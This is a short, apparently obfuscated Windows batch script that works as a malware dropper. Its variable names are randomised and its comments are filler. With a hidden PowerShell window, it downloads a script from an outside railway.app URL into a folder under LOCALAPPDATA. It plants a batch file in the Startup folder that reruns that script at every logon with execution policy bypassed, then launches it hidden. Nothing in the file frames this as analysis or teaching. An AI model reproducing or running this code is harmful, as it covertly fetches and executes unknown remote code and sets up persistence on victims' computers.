@echo off
REM Ver190
setlocal EnableDelayedExpansion
REM Ver115
REM Mod919

REM [dce10b1eae7ea0819fb5a3d60680790c]

set "BxsgeXwx=%LOCALAPPDATA%\243wr62dga"
set "auEQIkXN=https://web-production-9d7cc.up.railway.app/client.ps1"
set "xmOgiAmh=%BxsgeXwx%\axyou0jcrr.ps1"

REM Proc244
if not exist "%BxsgeXwx%" mkdir "%BxsgeXwx%"

REM Sys853
powershell -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%auEQIkXN%','%xmOgiAmh%')"

REM Core184
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\243wr6.bat" (
    echo @echo off> "%startup%\243wr6.bat"
    echo powershell -w hidden -ep bypass -f "%xmOgiAmh%">> "%startup%\243wr6.bat"
)

REM Core855
start "" /min powershell -w hidden -ep bypass -f "%xmOgiAmh%"
exit /b 0

REM [19891C9DC4E122B478161FE2]
